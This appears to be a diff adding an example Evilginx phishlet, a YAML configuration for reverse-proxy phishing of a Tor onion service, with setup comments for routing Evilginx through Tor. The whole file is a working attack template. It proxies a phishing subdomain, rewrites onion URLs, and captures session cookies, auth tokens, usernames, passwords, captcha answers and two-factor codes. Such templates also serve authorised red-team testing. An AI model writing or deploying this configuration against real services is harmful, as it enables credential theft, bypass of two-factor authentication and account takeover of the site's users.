@@ -1,0 +1,76 @@
+# Example phishlet for a v3 Onion service
+# This demonstrates how to create a phishlet for .onion addresses
+# 
+# Prerequisites:
+# 1. Tor must be running (sudo systemctl start tor)
+# 2. Configure Evilginx proxy: proxy socks5h 127.0.0.1 9050
+# 3. Enable proxy: proxy on
+#
+# Replace 'exampleonionservice3456789abcdefghijk.onion' with actual onion address
+
+min_ver: '3.0.0'
+
+# Proxy configuration for the onion service
+proxy_hosts:
+  # Main onion service domain
+  - phish_sub: 'secure'                                      # Your phishing subdomain
+    orig_sub: ''                                              # Onion services typically have no subdomain
+    domain: 'exampleonionservice3456789abcdefghijk.onion'   # The actual v3 onion address (56 characters)
+    session: true                                            # Enable session tracking
+    is_landing: true                                         # This is where phishing starts
+    auto_filter: true                                        # Auto-filter URLs to phishing domain
+
+# Optional: Content filtering for onion services
+# Some onion sites have hardcoded .onion references that need replacing
+sub_filters:
+  - triggers_on: 'exampleonionservice3456789abcdefghijk.onion'
+    orig_sub: ''
+    domain: 'exampleonionservice3456789abcdefghijk.onion'
+    search: 'exampleonionservice3456789abcdefghijk\.onion'
+    replace: 'secure.{domain}'                               # Replace with your phishing domain
+    mimes: ['text/html', 'application/javascript', 'text/css']
+    
+  # Fix absolute .onion URLs in content
+  - triggers_on: 'exampleonionservice3456789abcdefghijk.onion'
+    orig_sub: ''
+    domain: 'exampleonionservice3456789abcdefghijk.onion'
+    search: 'http://exampleonionservice3456789abcdefghijk\.onion'
+    replace: 'https://secure.{domain}'
+    mimes: ['text/html', 'application/javascript']
+
+# Authentication tokens to capture
+# Onion services often use standard cookies, just with .onion domain
+auth_tokens:
+  - domain: '.exampleonionservice3456789abcdefghijk.onion'  # Note the leading dot for subdomains
+    keys: ['session_id', 'auth_token']                      # Common cookie names (adjust as needed)
+    
+  # Optional: Capture additional tokens
+  - domain: '.exampleonionservice3456789abcdefghijk.onion'
+    keys: ['csrf_token', 'remember_token']
+    optional: true                                          # Don't fail if these are missing
+
+# Credential capture configuration
+credentials:
+  username:
+    key: 'username'                                         # Form field name for username
+    search: '(.*)'                                          # Capture everything
+    type: 'post'                                            # POST request (use 'json' for JSON APIs)
+    
+  password:
+    key: 'password'                                         # Form field name for password
+    search: '(.*)'
+    type: 'post'
+    
+  # Optional: Capture additional fields
+  custom:
+    - key: 'captcha'                                        # Many onion sites use captcha
+      search: '(.*)'
+      type: 'post'
+    - key: '2fa_code'                                       # Two-factor auth code
+      search: '([0-9]{6})'                                  # Usually 6 digits
+      type: 'post'
+
+# Login page configuration
+login:
+  domain: 'exampleonionservice3456789abcdefghijk.onion'    # The login domain
+  path: '/login'                                            # Login path (supports regex: '/auth/.*')
